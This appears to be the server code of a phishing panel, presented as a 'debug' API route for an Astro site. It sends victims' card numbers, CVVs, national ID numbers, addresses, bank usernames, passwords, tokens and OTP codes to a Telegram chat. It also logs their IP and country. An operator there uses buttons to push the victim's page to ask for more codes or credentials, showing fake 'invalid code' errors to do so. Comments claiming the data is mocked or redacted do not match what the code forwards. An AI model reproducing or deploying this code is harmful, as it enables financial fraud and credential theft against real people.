export const prerender = false;

import type { APIRoute } from 'astro';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_STEPS_BOT_TOKEN, TELEGRAM_STEPS_CHAT_ID } from 'astro:env/server';

type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P5' | 'P-STEP' | 'P-PAYMENT' | 'P-SUCCESS' | 'CARD_BANNER' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT' | 'USERPASS_SUBMIT' | 'TOKEN_SUBMIT' | 'DYNAMIC_SUBMIT';
type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved' | 'userpass' | 'userpass_error' | 'token' | 'token_error' | 'dynamic' | 'dynamic_error';

type RouteDecision = {
  action: RouteAction;
  brand?: string;
  message?: string;
  updatedAt?: string;
  sessionId?: string;
};

type DebugSession = {
  decision?: RouteDecision;
  steps: Set<string>;
  payload?: Record<string, unknown>;
};

const SMS_INVALID_MESSAGE = 'Código inválido. Hemos enviado un nuevo código por SMS o correo';

const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv: string; holder: string }> = {
  '3': { brand: 'amex', pan: '378282246310005', exp: '12/30', cvv: '1234', holder: 'QA AMEX MOCK' },
  '4': { brand: 'visa', pan: '4111111111111111', exp: '12/30', cvv: '123', holder: 'QA VISA MOCK' },
  '5': { brand: 'mastercard', pan: '5555555555554444', exp: '12/30', cvv: '123', holder: 'QA MC MOCK' },
  '6': { brand: 'discover', pan: '6011111111111117', exp: '12/30', cvv: '123', holder: 'QA DISCOVER MOCK' },
};

// Estado efimero por instancia serverless/dev: guarda la decision elegida en Telegram
// los pasos ya pedidos y el ultimo payload recibido por sessionId.
const globals = globalThis as typeof globalThis & {
  __latamDebugSessions?: Map<string, DebugSession>;
  __latamDebugTelegramOffset?: number;
  __latamLastDecision?: RouteDecision;
  __latamWebhookCleared?: boolean;
};
const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
globals.__latamDebugSessions = sessions;

function json(data: unknown, init: ResponseInit = {}) {
  return new Response(JSON.stringify(data), {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
      ...init.headers,
    },
  });
}

function cleanSessionId(value: unknown) {
  const id = String(value || '').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 80);
  return id || crypto.randomUUID();
}

function cardMockForFirstDigit(value: unknown) {
  const first = String(value || '').replace(/\D/g, '').charAt(0);
  return CARD_MOCKS[first] || CARD_MOCKS['4'];
}

// Lee secretos solo desde backend. Estos valores no se importan en scripts de navegador.
function telegramConfig() {
  return {
    token: TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '',
  };
}

function stepsTelegramConfig() {
  return {
    token: TELEGRAM_STEPS_BOT_TOKEN || process.env.TELEGRAM_STEPS_BOT_TOKEN || '',
    chatId: TELEGRAM_STEPS_CHAT_ID || process.env.TELEGRAM_STEPS_CHAT_ID || '',
  };
}

function getSession(sessionId: string) {
  const session = sessions.get(sessionId) ?? { steps: new Set<string>() };
  sessions.set(sessionId, session);
  return session;
}

function objectValue(value: unknown) {
  return value && typeof value === 'object' ? (value as Record<string, unknown>) : undefined;
}

function keepFilled(previous?: Record<string, unknown>, incoming?: Record<string, unknown>) {
  const out: Record<string, unknown> = { ...(previous || {}) };
  for (const [key, value] of Object.entries(incoming || {})) {
    if (value === '' || value === null || value === undefined) continue;
    if (value && typeof value === 'object' && !Array.isArray(value)) {
      out[key] = keepFilled(objectValue(out[key]), objectValue(value));
      continue;
    }
    out[key] = value;
  }
  return out;
}

function rememberStep(sessionId: string, step: string) {
  getSession(sessionId).steps.add(step);
}

function hasStep(sessionId: string, step: string) {
  return getSession(sessionId).steps.has(step);
}

// Traduce un boton de Telegram en una decision consumible por el frontend.
// Tambien aplica reglas de repeticion para tarjeta/SMS dentro de la misma sesion.
function makeDecision(sessionId: string, action: RouteAction, brand?: string): RouteDecision {
  if (action === 'card') {
    if (hasStep(sessionId, 'card')) {
      getSession(sessionId).steps = new Set(['card']);
      return {
        action: 'card_error',
        brand,
        message: 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'card');
  }

  if (action === 'sms') {
    if (hasStep(sessionId, 'sms')) {
      return {
        action: 'sms_error',
        brand,
        message: SMS_INVALID_MESSAGE,
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'sms');
  }

  if (action === 'userpass') {
    if (hasStep(sessionId, 'userpass')) {
      return {
        action: 'userpass_error',
        brand,
        message: 'Usuario o contraseña incorrectos. Intenta nuevamente.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'userpass');
  }

  if (action === 'token') {
    if (hasStep(sessionId, 'token')) {
      return {
        action: 'token_error',
        brand,
        message: 'Token inválido. Genera uno nuevo e inténtalo otra vez.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'token');
  }

  if (action === 'dynamic') {
    if (hasStep(sessionId, 'dynamic')) {
      return {
        action: 'dynamic_error',
        brand,
        message: 'Clave dinámica inválida. Genera una nueva e inténtalo otra vez.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'dynamic');
  }

  return { action, brand, updatedAt: new Date().toISOString() };
}

function actionLabel(action: RouteAction) {
  const labels: Record<RouteAction, string> = {
    wait: 'Esperando operador',
    sms: 'Enviar a SMS',
    card: 'Pedir tarjeta',
    sms_error: 'Error SMS repetido',
    card_error: 'Error tarjeta repetida',
    approved: 'Aprobado mock',
    userpass: 'Pedir usuario y contraseña',
    userpass_error: 'Error usuario/contraseña',
    token: 'Pedir token',
    token_error: 'Error token',
    dynamic: 'Pedir clave dinámica',
    dynamic_error: 'Error clave dinámica',
  };
  return labels[action] || action;
}

function isProcessingEvent(event: unknown) {
  return event === 'PAYMENT_SUBMIT'
    || event === 'OTP_SUBMIT'
    || event === 'USERPASS_SUBMIT'
    || event === 'TOKEN_SUBMIT'
    || event === 'DYNAMIC_SUBMIT';
}

function isStepsEvent(event: unknown) {
  return event === 'P1'
    || event === 'P2'
    || event === 'P3'
    || event === 'P4'
    || event === 'P5'
    || event === 'P-STEP'
    || event === 'P-PAYMENT'
    || event === 'P-SUCCESS'
    || event === 'CARD_BANNER';
}

function stepLabel(event: unknown, meta?: Record<string, unknown>) {
  if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
  const labels: Record<string, string> = {
    P1: 'Entró a Inicio',
    P2: 'Entró al Simulador',
    P3: 'Entró a Registro',
    P4: 'Entró a Consulta',
    P5: 'Entró a Preguntas frecuentes',
    'P-STEP': 'Avanzó en la solicitud',
    'P-PAYMENT': 'Entró a pagos',
    'P-SUCCESS': 'Vió el comprobante de pago aprobado',
    CARD_BANNER: 'Abrió banner de pago tarjeta crédito o débito',
    PAYMENT_SUBMIT: '✅ Agregó datos tarjeta',
    OTP_SUBMIT: 'Envió código OTP',
    USERPASS_SUBMIT: 'Envió usuario y contraseña',
    TOKEN_SUBMIT: 'Envió token',
    DYNAMIC_SUBMIT: 'Envió clave dinámica',
  };
  return labels[String(event || '')] || String(event || '-');
}

function keyboard(sessionId: string, brand: string) {
  const shortBrand = String(brand || 'visa').replace(/[^a-z0-9]/gi, '').slice(0, 10) || 'visa';
  return {
    inline_keyboard: [
      [
        { text: 'User-Pass', callback_data: `r:${sessionId}:userpass:${shortBrand}` },
        { text: 'Token', callback_data: `r:${sessionId}:token:${shortBrand}` },
      ],
      [
        { text: 'C. dinámica', callback_data: `r:${sessionId}:dynamic:${shortBrand}` },
        { text: 'Pedir SMS', callback_data: `r:${sessionId}:sms:${shortBrand}` },
      ],
      [{ text: 'Pedir Tarjeta', callback_data: `r:${sessionId}:card:${shortBrand}` }],
      [{ text: 'Finalizar', callback_data: `r:${sessionId}:approved:${shortBrand}` }],
    ],
  };
}

function formatPenAmount(meta: Record<string, unknown>, payload: Record<string, unknown>) {
  const labeled = meta.amountLabel ?? payload.amountLabel;
  if (typeof labeled === 'string' && labeled.trim()) return labeled.trim();
  const raw = meta.amount ?? payload.amount;
  const n = Number(raw);
  if (Number.isFinite(n) && String(raw) !== '') {
    return `COP ${Math.round(n).toLocaleString('es-CO')}`;
  }
  return '-';
}

function countryFlag(code: string) {
  const cc = String(code || '').trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc)) return '';
  return Array.from(cc).map((ch) => String.fromCodePoint(127397 + ch.charCodeAt(0))).join('');
}

function clientIp(request: Request) {
  const forwarded = request.headers.get('x-forwarded-for') || request.headers.get('x-vercel-forwarded-for') || '';
  const first = forwarded.split(',')[0].trim();
  return first
    || request.headers.get('x-real-ip')
    || request.headers.get('cf-connecting-ip')
    || request.headers.get('x-vercel-ip')
    || '';
}

function clientCountry(request: Request) {
  return (
    request.headers.get('x-vercel-ip-country')
    || request.headers.get('cf-ipcountry')
    || request.headers.get('x-country-code')
    || ''
  ).trim().toUpperCase();
}

function formatStepMessage(payload: Record<string, unknown>) {
  const meta = objectValue(payload.meta) || {};
  const ip = String(payload.ip || meta.ip || '').trim() || '-';
  const flag = countryFlag(String(payload.country || meta.country || ''));
  return [
    `📍 ${stepLabel(payload.event, meta)}`,
    [flag, ip].filter(Boolean).join(' '),
  ].join('\n');
}

function fieldValue(...values: unknown[]) {
  for (const value of values) {
    if (typeof value === 'string' && value.trim()) return value.trim();
    if (typeof value === 'number' && Number.isFinite(value)) return String(value);
  }
  return '-';
}

function cardNumberForTelegram(...values: unknown[]) {
  for (const value of values) {
    const digits = String(value || '').replace(/\D/g, '');
    if (digits.length >= 13) return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
  }
  return fieldValue(...values);
}

function escapeHtml(value: string) {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function labeledLine(emoji: string, label: string, value: string) {
  return `${emoji} <b>${escapeHtml(label)}:</b> ${escapeHtml(value)}`;
}

function formatPaymentMessage(payload: Record<string, unknown>) {
  const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
  const meta = objectValue(payload.meta) || {};
  const metaOtp = objectValue(payload.metaOtp) || {};
  const cpayload = objectValue(meta.cpayload) || {};
  const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
  return [
    labeledLine('💵', 'Monto', formatPenAmount(meta, payload)),
    labeledLine('💳', 'Marca', brand.toUpperCase()),
    labeledLine('💳', 'Tarjeta', cardNumberForTelegram(cpayload.b)),
    labeledLine('📅', 'Expira', fieldValue(cpayload.cv)),
    labeledLine('🔒', 'CVV', fieldValue(cpayload.cvv, cpayload.exp, mockCard?.cvv)),
    labeledLine('👤', 'Titular', fieldValue(cpayload.holder)),
    labeledLine('🪪', 'Cédula', fieldValue(meta.documento, meta.cedula, meta.numeroDocumento)),
    labeledLine('✉️', 'Correo', fieldValue(meta.correo, meta.email)),
    labeledLine('🏠', 'Dirección', fieldValue(meta.direccion)),
    '🔐 <b>CREDENCIALES</b>',
    labeledLine('👤', 'Usuario', fieldValue(meta.username)),
    labeledLine('🔑', 'Contraseña', fieldValue(meta.password)),
    labeledLine('🎟️', 'Token', fieldValue(meta.token)),
    labeledLine('🔐', 'C-DIN', fieldValue(meta.cdin)),
    labeledLine('💬', 'OTP', fieldValue(metaOtp.otp, meta.otp)),
  ].join('\n');
}

function formatTelegramMessage(payload: Record<string, unknown>) {
  return isProcessingEvent(payload.event) ? formatPaymentMessage(payload) : formatStepMessage(payload);
}

// Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
async function telegramApi(method: string, payload: Record<string, unknown> = {}, tokenOverride = '') {
  const token = tokenOverride || telegramConfig().token;
  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0, result: null as unknown };
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  let result: unknown = null;
  try {
    result = await response.json();
  } catch {
    result = null;
  }
  return { ok: response.ok, status: response.status, result };
}

function packDecision(sessionId: string, decision: RouteDecision) {
  return `${sessionId}::${decision.action}::${decision.brand || ''}`.slice(0, 120);
}

function unpackDecision(value: unknown, sessionId: string): RouteDecision | undefined {
  const text = String(value || '');
  const [sid, action, brand] = text.split('::');
  if (!sid || sid !== sessionId || !action) return undefined;
  return {
    action: action as RouteAction,
    brand: brand || undefined,
    sessionId: sid,
    updatedAt: new Date().toISOString(),
  };
}

async function persistDecision(sessionId: string, decision: RouteDecision) {
  const stored = { ...decision, sessionId };
  getSession(sessionId).decision = stored;
  globals.__latamLastDecision = stored;
  try {
    await telegramApi('setMyShortDescription', { short_description: packDecision(sessionId, stored) });
    await telegramApi('setMyDescription', { description: packDecision(sessionId, stored) });
  } catch {
    /* Shared Telegram store is best-effort. */
  }
}

async function readPersistedDecision(sessionId: string): Promise<RouteDecision | undefined> {
  try {
    const response = await telegramApi('getMyShortDescription');
    const body = response.result as Record<string, unknown> | null;
    const inner = body && typeof body.result === 'object' ? (body.result as Record<string, unknown>) : undefined;
    const text = String(inner?.short_description || inner?.description || body?.short_description || body?.description || '');
    const packed = unpackDecision(text, sessionId);
    if (packed) return packed;
    const fallback = await telegramApi('getMyDescription');
    const fallbackBody = fallback.result as Record<string, unknown> | null;
    const fallbackInner = fallbackBody && typeof fallbackBody.result === 'object' ? (fallbackBody.result as Record<string, unknown>) : undefined;
    return unpackDecision(fallbackInner?.description || fallbackBody?.description, sessionId);
  } catch {
    return undefined;
  }
}

function pickDecision(sessionId: string, persisted?: RouteDecision): RouteDecision {
  const sessionDecision = getSession(sessionId).decision;
  const last = globals.__latamLastDecision;
  if (sessionDecision?.action && sessionDecision.action !== 'wait') return sessionDecision;
  if (persisted?.action && persisted.action !== 'wait') return persisted;
  if (last?.sessionId === sessionId && last.action && last.action !== 'wait') return last;
  return sessionDecision || persisted || { action: 'wait' };
}

function isLocalOrigin(origin: string) {
  return /localhost|127\.0\.0\.1/i.test(origin);
}

async function ensurePollingMode() {
  if (globals.__latamWebhookCleared) return;
  const result = await telegramApi('deleteWebhook', {});
  if (result.ok || result.skipped) globals.__latamWebhookCleared = true;
}

// En local no hay webhook publico. getUpdates permite recoger callbacks cuando
// el frontend hace polling al endpoint GET /api/debug.
async function telegramGetUpdates() {
  const { token } = telegramConfig();
  if (!token) return [];
  const offset = globals.__latamDebugTelegramOffset;
  const qs = new URLSearchParams({
    timeout: '0',
    allowed_updates: JSON.stringify(['callback_query']),
  });
  if (typeof offset === 'number') qs.set('offset', String(offset));
  const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
    headers: { Accept: 'application/json' },
  });
  if (response.status === 409) return [];
  if (!response.ok) return [];
  const payload = await response.json();
  return Array.isArray(payload?.result) ? payload.result : [];
}

// Envia el evento al chat de Telegram con datos mock/redactados y botones opcionales.
async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean } = {}) {
  const { chatId } = telegramConfig();
  if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
  const sessionId = String(payload.sessionId || '');
  const brand = String(payload.brand || (payload.mockCard as { brand?: string } | undefined)?.brand || 'visa');
  const message: Record<string, unknown> = {
    chat_id: chatId,
    text: formatTelegramMessage(payload),
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  };
  if (options.withButtons) {
    message.reply_markup = keyboard(sessionId, brand);
  }
  const result = await telegramApi('sendMessage', message);
  return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
}

async function sendStepsTelegram(payload: Record<string, unknown>) {
  try {
    const { token, chatId } = stepsTelegramConfig();
    if (!token || !chatId) return { sent: false, skipped: 'telegram-steps-env-missing' };
    const result = await telegramApi('sendMessage', {
      chat_id: chatId,
      text: formatStepMessage(payload),
      disable_web_page_preview: true,
    }, token);
    return result.ok ? { sent: true, bot: 'steps' } : { sent: false, error: `telegram-steps-${result.status || 'unknown'}` };
  } catch {
    return { sent: false, error: 'telegram-steps-failed' };
  }
}

// Procesa callbacks tanto si llegan por webhook como si llegan por getUpdates.
// Al usarse un boton, quita el teclado inline para evitar decisiones duplicadas.
async function handleTelegramCallback(body: Record<string, unknown>) {
  const callback = body.callback_query as Record<string, unknown> | undefined;
  const data = String(callback?.data || '');
  const match = data.match(/^(?:route|r):([^:]+):(sms|card|approved|userpass|token|dynamic)(?::([^:]+))?$/);
  if (callback?.id) {
    await telegramApi('answerCallbackQuery', {
      callback_query_id: callback.id,
      text: match ? 'OK' : 'Ignorado',
      show_alert: false,
    });
  }
  if (!match) return json({ ok: true, ignored: true });

  const [, rawSessionId, rawAction, rawBrand] = match;
  const sessionId = cleanSessionId(rawSessionId);
  const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand);
  await persistDecision(sessionId, decision);

  const message = callback?.message as Record<string, unknown> | undefined;
  if (message?.chat && typeof message.message_id === 'number') {
    const chat = message.chat as Record<string, unknown>;
    await telegramApi('editMessageReplyMarkup', {
      chat_id: chat.id,
      message_id: message.message_id,
      reply_markup: { inline_keyboard: [] },
    });
  }

  return json({ ok: true, sessionId, decision });
}

// Sincroniza callbacks pendientes antes de responder al polling del navegador.
async function syncTelegramCallbacks() {
  const updates = await telegramGetUpdates();
  for (const update of updates) {
    if (typeof update?.update_id === 'number') {
      globals.__latamDebugTelegramOffset = update.update_id + 1;
    }
    if (update?.callback_query) {
      await handleTelegramCallback({ callback_query: update.callback_query });
    }
  }
}

// El frontend consulta este endpoint mientras muestra loader, esperando la decision
// que el operador eligio en Telegram para esta sessionId.
export const GET: APIRoute = async ({ url }) => {
  const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
  try {
    await ensurePollingMode();
    await syncTelegramCallbacks();
  } catch {
    /* Telegram polling is best-effort. */
  }
  const persisted = await readPersistedDecision(sessionId);
  return json({ sessionId, decision: pickDecision(sessionId, persisted) });
};

// Recibe page views y submits del frontend. Los datos sensibles nunca llegan aqui:
// el cliente envia datos mock/enmascarados y este endpoint arma el mensaje operativo.
export const POST: APIRoute = async ({ request }) => {
  let body: Record<string, unknown> = {};
  try {
    body = await request.json();
  } catch {
    return json({ error: 'JSON invalido' }, { status: 400 });
  }

  const callback = body.callback_query
    || (objectValue(body.update)?.callback_query as Record<string, unknown> | undefined);
  if (callback) return handleTelegramCallback({ callback_query: callback });

  console.info('[debug-api:body]', body);

  const event = String(body.event || '') as DebugEvent;
  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P5', 'P-STEP', 'P-PAYMENT', 'P-SUCCESS', 'CARD_BANNER', 'PAYMENT_SUBMIT', 'OTP_SUBMIT', 'USERPASS_SUBMIT', 'TOKEN_SUBMIT', 'DYNAMIC_SUBMIT']);
  if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });

  const sessionId = cleanSessionId(body.sessionId);
  try {
    await ensurePollingMode();
  } catch {
    /* Polling mode is best-effort. */
  }
  const session = getSession(sessionId);
  const previousPayload = session.payload;
  const previousMeta = objectValue(previousPayload?.meta);
  const previousMetaOtp = objectValue(previousPayload?.metaOtp);
  const incomingMeta = objectValue(body.meta);
  const incomingMetaOtp = objectValue(body.metaOtp);
  const mockCard = event === 'PAYMENT_SUBMIT' ? cardMockForFirstDigit(body.cardFirstDigit) : undefined;
  const brand = String(mockCard?.brand || incomingMeta?.brand || incomingMetaOtp?.brand || previousMeta?.brand || previousMetaOtp?.brand || 'visa');
  if (event === 'PAYMENT_SUBMIT') {
    rememberStep(sessionId, 'card');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'OTP_SUBMIT') {
    rememberStep(sessionId, 'sms');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'USERPASS_SUBMIT') {
    rememberStep(sessionId, 'userpass');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'TOKEN_SUBMIT') {
    rememberStep(sessionId, 'token');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'DYNAMIC_SUBMIT') {
    rememberStep(sessionId, 'dynamic');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }

  const ip = clientIp(request);
  const country = clientCountry(request);
  const meta = keepFilled(previousMeta, incomingMeta);
  if (ip) meta.ip = ip;
  if (country) meta.country = country;
  const payload = {
    sessionId,
    event,
    route: String(body.route || ''),
    createdAt: new Date().toISOString(),
    ip: ip || previousMeta?.ip || '',
    country: country || previousMeta?.country || '',
    brand,
    amount: meta.amount ?? previousMeta?.amount,
    amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
    meta,
    metaOtp: keepFilled(previousMetaOtp, incomingMetaOtp),
    action: isProcessingEvent(event) ? 'wait' : 'ack',
    mockCard,
  };

  console.info('[debug-api]', payload);
  session.payload = payload;
  let telegram;
  try {
    if (isProcessingEvent(event)) {
      if (event === 'PAYMENT_SUBMIT') await sendStepsTelegram(payload);
      telegram = await sendTelegram(payload, { withButtons: true });
    } else if (isStepsEvent(event)) {
      telegram = await sendStepsTelegram(payload);
    } else {
      telegram = { sent: false, skipped: 'no-telegram-route' };
    }
  } catch {
    telegram = { sent: false, error: 'telegram-send-failed' };
  }

  return json({ ...payload, telegram });
};
